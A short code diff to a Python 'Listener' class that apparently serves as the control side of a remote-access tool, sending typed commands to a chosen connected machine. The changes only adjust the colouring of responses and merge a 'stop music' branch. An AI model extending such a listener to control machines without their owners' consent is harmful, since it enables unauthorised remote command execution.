@@ -233,17 +233,10 @@ class Listener:
 					res = self.execute_remotely(command)
 					if res.split()[0] == "[-]": 
 						print(colored(res, "red"))
+					elif res.split()[0] == "[~]":
+						print(colored(res, "yellow"))
 					else:
 						print(colored(res, "green"))
-				else: print(colored("[-] You didn't choose any connection yet", "red"))
-
-			elif command == "stop music":
-				if self.chosen_connection:
-					res = self.execute_remotely(command)
-					if res.split()[0] == "[~]":
-						print(colored(res, "yellow"))
-					else: print(colored(res, "green"))
-
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command.strip() and command.split()[0] == "volume":
@@ -261,8 +254,11 @@ class Listener:
 
 			elif len(command.split()):
 				if self.chosen_connection:
-					result = self.execute_remotely(command)
-					print(result)
+					res = self.execute_remotely(command)
+					if res.split()[0] == "[-]":
+						print(colored(res, "red"))
+					else:
+						print(colored(res, "green"))
 
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
